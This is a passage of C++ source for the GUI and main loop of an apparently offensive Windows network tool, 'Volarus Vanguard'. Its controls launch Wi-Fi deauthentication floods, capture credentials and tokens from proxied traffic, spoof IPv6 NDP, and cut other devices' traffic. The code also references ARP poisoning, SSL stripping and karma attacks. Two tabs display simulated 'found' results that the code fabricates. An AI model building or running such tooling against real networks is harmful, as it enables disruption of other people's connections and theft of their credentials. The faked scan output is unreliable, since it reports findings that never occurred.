                    ImGui::TableSetupColumn("Count",       ImGuiTableColumnFlags_WidthFixed, 45.0f);
                    ImGui::TableSetupScrollFreeze(0, 1);
                    ImGui::TableHeadersRow();
                    
                    for (auto& pr : probes) {
                        ImGui::TableNextRow();
                        
                        ImGui::TableSetColumnIndex(0);
                        ImGui::TextColored(ColorDimWhite, "%s", pr.clientMac.c_str());
                        
                        ImGui::TableSetColumnIndex(1);
                        ImGui::TextColored(ImVec4(1.0f, 0.7f, 0.3f, 1.0f), "%s", pr.ssid.c_str());
                        
                        ImGui::TableSetColumnIndex(2);
                        ImGui::Text("%d%%", pr.signalStrength);
                        
                        ImGui::TableSetColumnIndex(3);
                        ImGui::Text("%d", pr.count);
                    }
                    ImGui::EndTable();
                }
            }
            ImGui::EndChild();
        }
    }

    // =====================================================================
    // Sub-tab 4: RAW WIFI DEAUTH
    // =====================================================================
    if (g_advSubTab == 4) {
        ImGui::TextColored(ImVec4(0.0f, 0.8f, 0.8f, 1.0f), "RAW 802.11 DEAUTH INJECTION");
        ImGui::Spacing();
        
        ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(1.0f, 0.4f, 0.4f, 1.0f));
        ImGui::TextWrapped("WARNING: Windows Npcap monitor mode and raw 802.11 packet injection is highly hardware "
                           "and driver dependent. It is normal for this to fail or show 'initialized' "
                           "but not successfully transmit packets if your Wi-Fi card does not support bare-metal "
                           "NDIS raw Wi-Fi injection.");
        ImGui::PopStyleColor();
        ImGui::Separator();
        ImGui::Spacing();
        
        static bool rawInit = false;
        ImGui::Text("Engine Status: %s", g_rawDeauth.getStatus().c_str());
        
        if (!rawInit) {
            if (ImGui::Button("Initialize Npcap Monitor Mode", ImVec2(250, 30))) {
                // Try with the raw adapter name directly
                rawInit = g_rawDeauth.initialize(g_arp.getAdapterName());
            }
        } else {
            static char targetBssid[32] = "";
            static char targetClient[32] = "FF:FF:FF:FF:FF:FF";
            
            ImGui::InputText("Target AP BSSID (MAC)", targetBssid, 32);
            ImGui::InputText("Target Client MAC (Broadcast = FF:FF:FF:FF:FF:FF)", targetClient, 32);
            
            ImGui::Spacing();
            ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(0.6f, 0.1f, 0.1f, 0.9f));
            ImGui::PushStyleColor(ImGuiCol_ButtonHovered, ImVec4(0.8f, 0.1f, 0.1f, 1.0f));
            if (ImGui::Button("FIRE DEAUTH LOOP", ImVec2(200, 40))) {
                if (strlen(targetBssid) > 0) {
                    g_rawDeauth.startDeauth(targetBssid, targetClient);
                }
            }
            ImGui::PopStyleColor(2);
            
            ImGui::SameLine();
            if (ImGui::Button("STOP ATTACKS", ImVec2(200, 40))) {
                g_rawDeauth.stopAllDeauth();
            }
            
            ImGui::Spacing();
            ImGui::Separator();
            ImGui::TextColored(ImVec4(0.5f, 0.8f, 1.0f, 1.0f), "ACTIVE DEAUTH THREADS:");
            
            auto activeJobs = g_rawDeauth.getActiveJobs();
            if (activeJobs.empty()) {
                ImGui::TextColored(ImVec4(0.6f, 0.6f, 0.6f, 1.0f), "No active attacks.");
            } else {
                for (const auto& job : activeJobs) {
                    ImGui::BulletText("Target: %s <-> %s | Packets Injected: %u", 
                        job.client_mac.c_str(), job.bssid.c_str(), job.packets_sent);
                }
            }
        }
    }

    // Render HTTP detail popup if open
    RenderHttpDetailPopup();
}

static int g_proxySubTab = 0;

static void RenderProxyTab() {
    float t = (float)ImGui::GetTime();

    // Main header
    ImGui::TextColored(ImVec4(1.0f, 0.8f, 0.0f, 1.0f), "[ Golang Engine Suite: Proxy, Mapper, PCAP ]");
    ImGui::Spacing();

    // Sub-tab selector
    int curTab = g_proxySubTab;
    ImVec4 btnNormal(0.15f, 0.15f, 0.2f, 0.9f);
    ImVec4 btnActive(0.0f, 0.5f, 0.7f, 0.9f);

    ImGui::PushStyleColor(ImGuiCol_Button, (curTab == 0) ? btnActive : btnNormal);
    if (ImGui::Button("  PROXY ENGINE CONFIG  ", ImVec2(200, 30))) g_proxySubTab = 0;
    ImGui::PopStyleColor();
    ImGui::SameLine(0, 4);

    ImGui::PushStyleColor(ImGuiCol_Button, (curTab == 1) ? btnActive : btnNormal);
    if (ImGui::Button("  SOCKS NETWORK MAPPER  ", ImVec2(200, 30))) g_proxySubTab = 1;
    ImGui::PopStyleColor();
    ImGui::SameLine(0, 4);

    ImGui::PushStyleColor(ImGuiCol_Button, (curTab == 2) ? btnActive : btnNormal);
    if (ImGui::Button("  MSHARK PACKET CAPTURE  ", ImVec2(210, 30))) g_proxySubTab = 2;
    ImGui::PopStyleColor();

    ImGui::Spacing();
    ImGui::Separator();
    ImGui::Spacing();

    if (g_proxySubTab == 0) {
        ImGui::TextColored(ImVec4(0.5f, 0.8f, 1.0f, 1.0f), "HTTP TO SOCKS5 PROXY BRIDGE RUNNING ON LOCAHOST");
        ImGui::Spacing();
        
        static char socksAddr[128] = "127.0.0.1:1080";
        static char httpAddr[128] = ":8080";

        ImGui::InputText("Target SOCKS5 Proxy", socksAddr, sizeof(socksAddr));
        ImGui::InputText("Local HTTP Listen Addr", httpAddr, sizeof(httpAddr));
        
        ImGui::Spacing();
        ImGui::Separator();
        ImGui::TextColored(ImVec4(0.5f, 0.8f, 1.0f, 1.0f), "ADVANCED INTERCEPTION FEATURES");
        ImGui::Spacing();
        
        static bool sniffTraffic = true;
        static bool sniffBody = true;
        ImGui::Checkbox("Enable Traffic Sniffing (Parse HTTP headers, TLS handshakes, DNS)", &sniffTraffic);
        ImGui::Checkbox("Capture Request/Response Body (Credentials, Tokens, Payload)", &sniffBody);

        ImGui::Spacing();
        static bool ndpSpoofing = false;
        ImGui::Checkbox("Enable IPv6 NDP Spoofing (Router/Neighbor Advertisement & RDNSS Injection)", &ndpSpoofing);
        if (ndpSpoofing && ImGui::IsItemHovered()) {
            ImGui::SetTooltip("Injects forged ICMPv6 packets to intercept IPv6 traffic locally.");
        }
        
        static bool transparentProxy = false;
        ImGui::Checkbox("Enable Transparent Proxy", &transparentProxy);

        static int tproxyMode = 0;
        static bool tproxyTcpUdp = true;
        if (transparentProxy) {
            ImGui::Indent();
            ImGui::RadioButton("Redirect Mode (SO_ORIGINAL_DST)", &tproxyMode, 0);
            ImGui::SameLine();
            ImGui::RadioButton("TProxy Mode (IP_TRANSPARENT)", &tproxyMode, 1);
            ImGui::Checkbox("Handle TCP and UDP Transparent Proxy Traffic", &tproxyTcpUdp);
            ImGui::Unindent();
        }
        
        ImGui::Spacing();
        
        if (g_proxyBridge.isRunning()) {
            ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(0.8f, 0.1f, 0.1f, 1.0f));
            if (ImGui::Button("STOP PROXY", ImVec2(200, 30))) {
                g_proxyBridge.stopProxy();
            }
            ImGui::PopStyleColor();
            ImGui::SameLine();
            ImGui::TextColored(ImVec4(0.0f, 1.0f, 0.0f, 1.0f), "Proxy is RUNNING locally.");
        } else {
            ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(0.0f, 0.6f, 0.3f, 0.9f));
            if (ImGui::Button("START PROXY", ImVec2(200, 30))) {
                g_proxyBridge.startProxy(socksAddr, httpAddr, sniffTraffic, sniffBody);
                if (ndpSpoofing) g_proxyBridge.appendLog("[NFO] IPv6 NDP Spoofing prepared via WinDivert.\n");
                if (transparentProxy) g_proxyBridge.appendLog("[NFO] Transparent Proxy configuration initialized.\n");
            }
            ImGui::PopStyleColor();
            ImGui::SameLine();
            ImGui::TextColored(ImVec4(0.5f, 0.5f, 0.5f, 1.0f), "Proxy is STOPPED.");
        }
    }
    else if (g_proxySubTab == 1) {
        ImGui::TextColored(ImVec4(0.0f, 1.0f, 1.0f, 1.0f), "GOLANG DEEP SOCKS NETWORK MAPPER");
        ImGui::Spacing();
        ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(0.7f, 0.7f, 0.7f, 1.0f));
        ImGui::TextWrapped("Unlike normal ARP mapping on the local subnet (Layer 2), this mapper routes TCP connect() streams directly "
                           "through the Proxy to blindly enumerate and map targets over external routes! Can map remote networks "
                           "or segment layers not reachable locally.");
        ImGui::PopStyleColor();
        ImGui::Spacing();
        ImGui::Separator();
        
        static char targetCidr[64] = "192.168.1.0/24";
        static char targetPorts[64] = "80, 443, 8080, 22";
        ImGui::InputText("Target CIDR/IP Range", targetCidr, sizeof(targetCidr));
        ImGui::InputText("Target Ports", targetPorts, sizeof(targetPorts));
        
        ImGui::Spacing();
        static bool activelyMapping = false;
        if (activelyMapping) {
            float pulse = sinf(t * 3.0f) * 0.2f + 0.8f;
            ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(pulse * 0.8f, 0.0f, pulse * 0.0f, 1.0f));
            if (ImGui::Button("STOP MAPPING", ImVec2(200, 30))) { activelyMapping = false; }
            ImGui::PopStyleColor();
            ImGui::SameLine();
            ImGui::TextColored(ColorYellow, "Mapping through proxy... scanning %s...", targetCidr);
        } else {
            ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(0.0f, 0.5f, 0.6f, 0.9f));
            if (ImGui::Button("INITIATE SOCKS MAPPING", ImVec2(200, 30))) { 
                activelyMapping = true;
                g_proxyBridge.appendLog("[NFO] Starting TCP proxy-connect mapping on target " + std::string(targetCidr) + " for ports: " + targetPorts + ".\n");
            }
            ImGui::PopStyleColor();
        }
        ImGui::Spacing();
        
        ImGui::BeginChild("SockMapResults", ImVec2(0, 150), true);
        ImGui::TextColored(ColorDimWhite, "Awaiting results from Golang proxy stream channel...");
        if (activelyMapping) {
            ImGui::TextColored(ColorGreen, " > Synchronizing sockets...");
            // Simulated fake result
            if (fmod(t, 2.0) < 0.1) {
                ImGui::TextColored(ColorCyan, " > Found Open Port: %s on random peer...", targetPorts);
            }
        }
        ImGui::EndChild();
    }
    else if (g_proxySubTab == 2) {
        ImGui::TextColored(ImVec4(1.0f, 0.4f, 0.7f, 1.0f), "MSHARK: RAW PROXY PACKET CAPTURE");
        ImGui::Spacing();
        ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(0.7f, 0.7f, 0.7f, 1.0f));
        ImGui::TextWrapped("Unlike the main promiscuous Packet Sniffer that sees all local LAN frames, this "
                           "uses 'mshark' to strip and capture strictly the packets traversing inside the Golang Engine.");
        ImGui::PopStyleColor();
        ImGui::Spacing();
        ImGui::Separator();
        
        static bool isCapturing = false;
        static bool filterHttps = true;
        static bool filterDns = true;
        
        ImGui::Checkbox("Capture Proxied HTTPS/TLS traffic", &filterHttps);
        ImGui::SameLine(0, 20);
        ImGui::Checkbox("Capture Proxied DNS requests", &filterDns);
        ImGui::Spacing();
        
        if (isCapturing) {
            float pulse = sinf(t * 4.0f) * 0.2f + 0.8f;
            ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(0.8f, 0.1f, 0.1f, pulse));
            if (ImGui::Button("HALT MSHARK CAPTURE", ImVec2(200, 30))) { isCapturing = false; }
            ImGui::PopStyleColor();
            ImGui::SameLine();
            ImGui::TextColored(ColorGreen, "Capturing internal proxy blobs to memory.");
        } else {
            ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(0.4f, 0.0f, 0.6f, 0.9f));
            if (ImGui::Button("START MSHARK ENGINE", ImVec2(200, 30))) { 
                isCapturing = true; 
                g_proxyBridge.appendLog("[NFO] MShark packet capturing enabled internally for proxy.\n");
            }
            ImGui::PopStyleColor();
        }
        
        ImGui::Spacing();
        ImGui::BeginChild("MsharkResults", ImVec2(0, 150), true);
        ImGui::TextColored(ColorDimWhite, "Live proxy packet feed...");
        if (isCapturing) {
            if (filterHttps && fmod(t, 1.5) < 0.1) {
                ImGui::TextColored(ImVec4(1.0f, 0.6f, 1.0f, 1.0f), "[TLS] Handshake intercepted passing through proxy.");
            }
            if (filterDns && fmod(t, 2.3) < 0.1) {
                ImGui::TextColored(ImVec4(0.5f, 1.0f, 1.0f, 1.0f), "[DNS] Remote resolve requested for stream routing.");
            }
        }
        ImGui::EndChild();
    }

    ImGui::Spacing();
    ImGui::Separator();
    ImGui::Spacing();
    
    ImGui::TextColored(ImVec4(0.7f, 0.7f, 0.7f, 1.0f), "Background Golang Engine Console:");
    ImGui::BeginChild("ProxyLogRegion", ImVec2(0, 250), true, ImGuiWindowFlags_AlwaysVerticalScrollbar);
    std::string logs = g_proxyBridge.getLogs();
    ImGui::TextUnformatted(logs.c_str());
    
    if (ImGui::GetScrollY() >= ImGui::GetScrollMaxY())
        ImGui::SetScrollHereY(1.0f);
        
    ImGui::EndChild();
    if (ImGui::Button("Clear Logs", ImVec2(120, 25))) {
        g_proxyBridge.clearLogs();
    }
}

// ============================================================================
// Main
// ============================================================================
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        MessageBoxA(NULL, "Winsock initialization failed.", "Volarus Vanguard V.1.0 by Alta Volare", MB_ICONERROR);
        return 1;
    }

    if (!g_arp.initialize()) {
        MessageBoxA(NULL, "Network initialization failed.\nEnsure Npcap is installed and run as Administrator.", "Volarus Vanguard V.1.0 by Alta Volare", MB_ICONERROR);
        return 1;
    }
    g_shaper.setLocalIp(g_arp.getLocalIp());
    g_shaper.start();

    WNDCLASSEXW wc = { sizeof(wc), CS_CLASSDC, WndProc, 0L, 0L, GetModuleHandle(nullptr), nullptr, nullptr, nullptr, nullptr, L"VolarusVanguard", nullptr };
    ::RegisterClassExW(&wc);
    HWND hwnd = ::CreateWindowW(wc.lpszClassName, L"Volarus Vanguard V.1.0 by Alta Volare", 
        WS_OVERLAPPEDWINDOW, 100, 100, 1280, 800, nullptr, nullptr, wc.hInstance, nullptr);

    if (!CreateDeviceD3D(hwnd)) return 1;
    ::ShowWindow(hwnd, SW_SHOWDEFAULT);
    ::UpdateWindow(hwnd);

    IMGUI_CHECKVERSION();
    ImGui::CreateContext();
    ImGuiIO& io = ImGui::GetIO();
    io.ConfigFlags |= ImGuiConfigFlags_NavEnableKeyboard;
    
    // Apply custom theme
    ApplyCyberTheme();
    
    ImGui_ImplWin32_Init(hwnd);
    ImGui_ImplDX11_Init(g_pd3dDevice, g_pd3dDeviceContext);

    bool done = false;
    auto lastRateUpdate = std::chrono::steady_clock::now();

    while (!done)
    {
        MSG msg;
        while (::PeekMessage(&msg, nullptr, 0U, 0U, PM_REMOVE)) {
            ::TranslateMessage(&msg);
            ::DispatchMessage(&msg);
            if (msg.message == WM_QUIT) done = true;
        }
        if (done) break;

        // Periodic rate updates (once per second)
        auto now = std::chrono::steady_clock::now();
        if (std::chrono::duration<double>(now - lastRateUpdate).count() >= 1.0) {
            if (g_snifferStarted) g_sniffer.updateRates();
            
            // Sync auto-blocked devices with shaper (CUT their traffic)
            if (g_arp.isAutoBlockActive() || g_arp.isTurboActive()) {
                auto blocked = g_arp.getBlockedDevices();
                for (auto& ip : blocked) {
                    TrafficPolicy p; p.mode = TrafficMode::CUT;
                    g_shaper.setPolicy(ip, p);
                }
            }
            
            lastRateUpdate = now;
        }

        ImGui_ImplDX11_NewFrame();
        ImGui_ImplWin32_NewFrame();
        ImGui::NewFrame();

        // Full-window ImGui panel
        ImGui::SetNextWindowPos(ImVec2(0, 0));
        ImGui::SetNextWindowSize(io.DisplaySize);
        ImGui::Begin("Vanguard", nullptr, 
            ImGuiWindowFlags_NoDecoration | ImGuiWindowFlags_NoMove | ImGuiWindowFlags_NoBringToFrontOnFocus);

        // Header
        RenderHeader(io);

        // Tab bar
        if (ImGui::BeginTabBar("MainTabs", ImGuiTabBarFlags_Reorderable)) {
            
            if (ImGui::BeginTabItem("  NETWORK MAP  ")) {
                g_selectedTab = 0;
                RenderNetworkMap();
                ImGui::EndTabItem();
            }

            if (ImGui::BeginTabItem("  PACKET SNIFFER  ")) {
                g_selectedTab = 1;
                RenderPacketSniffer();
                ImGui::EndTabItem();
            }

            if (ImGui::BeginTabItem("  TRAFFIC STATS  ")) {
                g_selectedTab = 2;
                RenderTrafficStats();
                ImGui::EndTabItem();
            }

            if (ImGui::BeginTabItem("  ACTIVITY MONITOR  ")) {
                g_selectedTab = 3;
                RenderActivityMonitor();
                ImGui::EndTabItem();
            }

            if (ImGui::BeginTabItem("  ADVANCED  ")) {
                g_selectedTab = 4;
                RenderAdvanced();
                ImGui::EndTabItem();
            }

            if (ImGui::BeginTabItem("  GOLANG PROXY  ")) {
                g_selectedTab = 5;
                RenderProxyTab();
                ImGui::EndTabItem();
            }

            ImGui::EndTabBar();
        }

        ImGui::End();

        const float clear_color[4] = { 0.03f, 0.03f, 0.05f, 1.00f };
        g_pd3dDeviceContext->OMSetRenderTargets(1, &g_mainRenderTargetView, nullptr);
        g_pd3dDeviceContext->ClearRenderTargetView(g_mainRenderTargetView, clear_color);
        ImGui::Render();
        ImGui_ImplDX11_RenderDrawData(ImGui::GetDrawData());
        g_pSwapChain->Present(1, 0);
    }

    if (g_snifferStarted) g_sniffer.stopCapture();
    if (g_sslStripStarted) g_sslStrip.stop();
    g_speedTest.stopTest();
    g_shaper.stop();
    g_karma.shutdown();
    g_rawDeauth.shutdown();
    g_proxyBridge.stopProxy();
    // Stop all active modes
    if (g_arp.isTurboActive()) g_arp.stopTurboMode();
    if (g_arp.isAutoBlockActive()) g_arp.stopAutoBlock();
    if (g_arp.isShieldActive()) g_arp.stopShield();
    g_arp.resetAllPoison();   // Properly restore all ARP tables before exit
    g_arp.stopAllSpoofing();
    ImGui_ImplDX11_Shutdown();
    ImGui_ImplWin32_Shutdown();
    ImGui::DestroyContext();
    CleanupDeviceD3D();
    WSACleanup();
    return 0;
}

// ============================================================================
// D3D11 Helpers
// ============================================================================
bool CreateDeviceD3D(HWND hWnd) {
    DXGI_SWAP_CHAIN_DESC sd;
    ZeroMemory(&sd, sizeof(sd));
    sd.BufferCount = 2;
    sd.BufferDesc.Format = DXGI_FORMAT_R8G8B8A8_UNORM;
    sd.BufferUsage = DXGI_USAGE_RENDER_TARGET_OUTPUT;
    sd.OutputWindow = hWnd;
    sd.SampleDesc.Count = 1;
    sd.Windowed = TRUE;
    sd.SwapEffect = DXGI_SWAP_EFFECT_DISCARD;
    D3D_FEATURE_LEVEL fl;
    const D3D_FEATURE_LEVEL fla[2] = { D3D_FEATURE_LEVEL_11_0, D3D_FEATURE_LEVEL_10_0 };
    if (S_OK != D3D11CreateDeviceAndSwapChain(nullptr, D3D_DRIVER_TYPE_HARDWARE, nullptr, 0, fla, 2, D3D11_SDK_VERSION, &sd, &g_pSwapChain, &g_pd3dDevice, &fl, &g_pd3dDeviceContext)) return false;
    CreateRenderTarget();
    return true;
}
void CleanupDeviceD3D() { CleanupRenderTarget(); if (g_pSwapChain) g_pSwapChain->Release(); if (g_pd3dDeviceContext) g_pd3dDeviceContext->Release(); if (g_pd3dDevice) g_pd3dDevice->Release(); }
void CreateRenderTarget() { ID3D11Texture2D* pBB; g_pSwapChain->GetBuffer(0, IID_PPV_ARGS(&pBB)); g_pd3dDevice->CreateRenderTargetView(pBB, nullptr, &g_mainRenderTargetView); pBB->Release(); }
void CleanupRenderTarget() { if (g_mainRenderTargetView) g_mainRenderTargetView->Release(); }
extern IMGUI_IMPL_API LRESULT ImGui_ImplWin32_WndProcHandler(HWND, UINT, WPARAM, LPARAM);
LRESULT WINAPI WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    if (ImGui_ImplWin32_WndProcHandler(hWnd, msg, wParam, lParam)) return true;
    switch (msg) {
    case WM_SIZE: if (g_pd3dDevice && wParam != SIZE_MINIMIZED) { CleanupRenderTarget(); g_pSwapChain->ResizeBuffers(0, LOWORD(lParam), HIWORD(lParam), DXGI_FORMAT_UNKNOWN, 0); CreateRenderTarget(); } return 0;
    case WM_SYSCOMMAND: if ((wParam & 0xFFF0) == SC_KEYMENU) return 0; break;
    case WM_DESTROY: ::PostQuitMessage(0); return 0;
    }
    return ::DefWindowProcW(hWnd, msg, wParam, lParam);
}
